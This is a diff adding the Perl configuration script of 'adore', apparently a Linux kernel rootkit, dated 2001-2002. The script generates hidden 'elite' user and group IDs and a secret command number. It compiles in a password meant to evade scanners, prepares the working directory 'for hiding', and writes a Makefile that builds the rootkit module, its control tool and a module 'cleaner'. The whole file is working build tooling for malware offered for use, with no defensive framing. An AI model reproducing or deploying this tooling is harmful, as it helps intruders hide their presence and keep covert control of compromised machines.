@@ -1,0 +1,248 @@
+#!/usr/bin/perl
+
+# (C) 2001, 2002 by Stealth.
+# Using at your own risk. Licensed under BSDish license.
+# See LICENSE-file. Standard disclaimer applies.
+
+# adore configuration script
+# One can also use Makefile.gen edited by hand
+# when perl is not available or one needs special values
+# (crosscompiling)
+
+#
+# Initializink, Pitr ... 
+#
+
+$elite_uid = 0;
+$elite_cmd = 0;
+$cc = "";
+$| = 1;
+$current_adore = 53;
+$bw = shift || 4;
+
+print "\nUsing byte-with of $bw for UID/GID\n";
+
+sub get_pass()
+{
+	print "\n\nSince version 0.33 Adore requires 'authentication' for\n".
+	      "its services. You will be prompted for a password now and this\n".
+	      "password will be compiled into 'adore' and 'ava' so no further actions\n".
+	      "by you are required.\nThis procedure will save adore from scanners.\n".
+	      "Try to choose a unique name that won't clash with normal calls to mkdir(2).\n";
+
+	print "Password (echoed):"; my $s = <STDIN>;
+	chop($s);
+	return $s;
+}
+
+#
+# find elite UID+GID
+#
+sub get_elite_id()
+{
+	my $uid = 0, $p;
+	if ($bw == 2) {
+		$p = "S";
+	} elsif ($bw == 4) {
+		$p = "I";
+	} else {
+		print "Nuts! Stupid byte-width of $bw. Use either 2 or 4.\n";
+		exit;
+	}
+
+	open(R, "/dev/random") or die "$!";
+	while (defined(getpwuid($uid))) {
+		read R, $uid, $bw;
+		$uid = unpack($p, $uid);
+	}
+	read R, $gid, $bw;
+	close(R);
+	$gid = unpack($p, $gid);
+	return ($uid, $gid);
+}
+
+#
+# randomly choose an ELITE_CMD
+#
+sub get_elite_cmd()
+{
+	srand();
+	return int(10000 + rand 100000);
+}
+
+#
+sub check_smp()
+{
+	if (`uname -a` =~ "SMP") {
+		return "YES";
+	} else {
+		return "NO";
+	}
+}
+
+# check for CONFIG_MODVERSIONS=y
+sub check_modversions()
+{
+	open I, "</proc/ksyms" or die "open(/proc/ksyms) $!";
+	while (<I>) {
+		if (/kernel_thread_R.+/) {
+			close I;
+			return "YES";
+		}
+		if (/kernel_thread/) {
+			close I;
+			return "NO";
+		}
+	}	
+	print "WARN: Can't find kernel_thread!! Using \"NO\"!";
+	return "NO";
+}
+
+#
+# Look for loaded modules
+#
+sub check_modules()
+{
+	print "Loaded modules:\n";
+	system("cat /proc/modules");
+}
+
+#
+# Look where insmod is located
+#
+sub check_insmod()
+{
+	my $s;
+	print "Checking 4 insmod ... ";
+	foreach (qw(/bin /sbin /usr/sbin /usr/bin)) {
+		if (-x ($s = "$_/insmod")) {
+			print "found $s -- OK\n";
+			return $s;
+		}
+	}
+	print "WARN: No insmod found in /bin, /sbin, /usr/sbin, /usr/bin! Fix init-script by hand!\n";
+	return "insmod";
+}
+
+#
+# RH 7 has 'kgcc'
+#
+sub check_cc()
+{
+	my $r;
+	if (-x "/usr/bin/kgcc") {
+		$r = "kgcc";
+	} else {
+		$r = "cc";
+	}
+	return $r;
+}
+
+
+##############################
+#
+# main()
+#
+##############################
+
+print "\nStarting adore configuration ...\n\n";
+($uid, $gid) = get_elite_id();
+
+print "Checking 4 ELITE_UID + ELITE_GID ... ";
+print "found $uid, $gid\n";
+
+print "Checking 4 ELITE_CMD ... ";
+print "using ", $elite_cmd = get_elite_cmd(), "\n";
+
+print "Checking 4 SMP ... ", $has_smp = check_smp(), "\n";
+
+print "Checking 4 MODVERSIONS ... ", $has_modversions = check_modversions(), "\n";
+
+print "Checking for kgcc ... ";
+print "found ", $cc = check_cc(), "\n";
+
+
+$insmod = check_insmod();
+print "\n";
+
+check_modules();
+
+$pwd = get_pass();
+
+$target_dir = `pwd`;
+chop($target_dir);
+
+print "\nPreparing $target_dir (== cwd) for hiding ... ";
+chown($elite_uid, 0, $target_dir) or print "(failed)";
+
+print "\n\n";
+print "Creating Makefile ...\n";
+
+print "\n\a*** Edit adore.h for the hidden services ***\n";
+
+#
+# create an Makefile backup for ELITE_CMD etc.
+#
+
+$date = `date`;
+$date =~ tr/ /_/;
+
+system("touch Makefile;cp Makefile Makefile_$date");
+
+#
+# write Makefile
+#
+
+open(O, ">Makefile") or die "open(Makefile) $!";
+
+print O "#\nCC=$cc\nCFLAGS=-O2 -Wall\n\n";
+print O "#CFLAGS+=-m486\nCFLAGS+=-DELITE_CMD=$elite_cmd\nINC=-I/usr/src/linux/include";
+print O "\nCFLAGS+=-DELITE_UID=${uid}U -DELITE_GID=${gid}U\nCFLAGS+=-DCURRENT_ADORE=$current_adore\n".
+	"CFLAGS+=-DADORE_KEY=\\\"$pwd\\\"\n\n";
+
+if ($has_smp eq "NO") {
+	print O "#";	
+}
+
+print O "CFLAGS+=-D__SMP__\n";
+
+
+print O "\n";
+
+if ($has_modversions eq "NO") {
+	print O "#";
+}
+
+print O<<_EOF_;
+CFLAGS+=-DMODVERSIONS
+
+all:	adore ava cleaner
+
+adore: adore.c
+	rm -f adore.o
+	\$(CC) -c \$(INC) \$(CFLAGS) adore.c -o adore.o
+
+ava: ava.c libinvisible.c
+	\$(CC) \$(CFLAGS) ava.c libinvisible.c -o ava
+
+dummy: dummy.c
+	\$(CC) -c \$(INC) \$(CFLAGS) dummy.c
+
+rename: rename.c
+	\$(CC) -c \$(INC) \$(CFLAGS) rename.c
+
+module.o: module.c
+	\$(CC) -c -fPIC \$(INC) \$(CFLAGS) module.c
+
+cleaner: cleaner.c
+	\$(CC) \$(INC) -c \$(CFLAGS) cleaner.c
+clean:
+	rm -f core ava *.o
+_EOF_
+
+#
+# Done :>
+#
+
+close O;
+
